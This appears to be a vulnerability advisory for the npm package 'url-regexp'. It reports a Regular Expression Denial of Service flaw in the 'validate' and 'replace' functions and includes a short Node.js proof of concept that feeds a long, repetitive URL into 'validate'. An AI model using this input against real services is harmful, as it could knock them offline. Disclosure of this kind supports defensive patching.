# Overview

RegExp object to match and validate URL(s).

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). An attacker providing a long URL to `validate` or `replace` function will cause a Denial of Service attack.

# PoC

```node
var regex = require("url-regexp");
regex.validate(
  "http://huntr.dev.test21312312.test21312312.test21312312.test21312312.test21312312.test21312312.test21312312.test21312312.test21312312.test21312312.test21312312.test21312312.test21312312.test21312312"
);
```
